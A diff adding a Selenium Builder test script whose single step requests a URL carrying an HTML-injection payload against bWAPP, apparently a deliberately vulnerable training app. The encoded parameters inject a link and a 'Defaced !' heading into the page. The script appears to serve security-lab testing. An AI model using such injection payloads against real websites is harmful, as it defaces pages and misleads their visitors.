@@ -1,0 +1,17 @@
+{
+  "type": "script",
+  "seleniumVersion": "2",
+  "formatVersion": 2,
+  "steps": [
+    {
+      "type": "get",
+      "url": "?firstname=%3Ca%20href=%22http://google.com%22%3E%3Ch1%3EDefaced%20!%3C/h1%3E%3C/a%3E&lastname=%3Ch2%3EbWAPP%3C/h2%3E&form=submit"
+    }
+  ],
+  "data": {
+    "configs": {},
+    "source": "none"
+  },
+  "inputs": [],
+  "timeoutSeconds": 60
+}
